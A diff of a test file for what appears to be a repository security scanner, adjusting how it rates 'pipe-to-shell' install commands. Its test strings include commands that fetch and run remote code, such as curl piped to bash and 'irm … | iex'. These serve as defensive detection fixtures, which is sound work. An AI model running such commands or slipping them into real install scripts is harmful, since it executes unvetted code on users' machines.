@@ -84,13 +84,13 @@ test('scanRepo fetches README, tree and picked files through the API, by repo na
   for (const c of f.calls) assert.match(c.url, /^https:\/\/api\.github\.com\/repos\/o\/r\//);
 });
 
-test("Tool Scout's own README, SKILL.md and scripts scan clean", async () => {
+test("Tool Scout's own README, SKILL.md and scripts raise nothing above low (README quotes examples)", async () => {
   const fs = await import('node:fs');
   const read = (f) => fs.readFileSync(new URL(`../${f}`, import.meta.url), 'utf8');
   const explained = explainedHostsOf(read('README.md'));
   const files = [['README.md', 'readme'], ['skills/scout/SKILL.md', 'skill'], ['scripts/scout.mjs', 'script'], ['package.json', 'package'],
     ...fs.readdirSync(new URL('../scripts/lib/', import.meta.url)).map((f) => [`scripts/lib/${f}`, 'script'])];
-  for (const [f, role] of files) assert.deepEqual(scanText(read(f), { file: f, role, explainedHosts: explained }), [], f);
+  for (const [f, role] of files) assert.deepEqual(scanText(read(f), { file: f, role, explainedHosts: explained }).filter((x) => x.severity !== 'low'), [], f);
 });
 
 test('regressions from real repos: honesty rules, quoted patterns, self-installers, badge logos', () => {
@@ -112,6 +112,7 @@ test('regressions from real repos: honesty rules, quoted patterns, self-installe
 
 test('regressions: escaped pipes in tables, fixtures, deep build helpers, URL-encoded data URIs', () => {
   assert.deepEqual(scanText('| Pattern | `curl \\| bash` | high |', { file: 'README', role: 'readme' }), []);
+  assert.deepEqual(scanText('| flag | `curl … \\| sh`, `irm https://x.io \\| iex` |', { file: 'README', role: 'readme' }), []);
   const tree = ['tests/fixtures/agent/.claude/skills/helper/SKILL.md', 'skills/real/SKILL.md', 'hack/build-scripts/get-etcd.sh', 'get.sh', 'scripts/install.sh']
     .map((p) => ({ path: p, type: 'blob', size: 10 }));
   assert.deepEqual(pickFiles(tree).map((f) => f.path), ['skills/real/SKILL.md', 'get.sh', 'scripts/install.sh']);
@@ -122,4 +123,9 @@ test('regressions: escaped pipes in tables, fixtures, deep build helpers, URL-en
 test('pipe-to-shell through a $SUDO variable is caught', () => {
   assert.deepEqual(ids(scanText('curl -fsSL https://x.example/setup | $SUDO bash -', { file: 'install.sh', role: 'script' })), ['pipe-to-shell:high']);
   assert.deepEqual(ids(scanText('curl -fsSL https://deb.nodesource.com/setup_22.x | ${SUDO} bash -', { file: 'install.sh', role: 'script' })), ['pipe-to-shell:low']);
+});
+
+test('a pipe-to-shell with no URL, host or variable is a pattern mention', () => {
+  assert.deepEqual(ids(scanText('Flags `curl … | sh` style installs.', { file: 'SKILL.md', role: 'skill' })), ['pipe-to-shell:low']);
+  assert.deepEqual(ids(scanText('curl -fsSL "$INSTALLER_URL" | bash', { file: 'install.sh', role: 'script' })), ['pipe-to-shell:high']);
 });
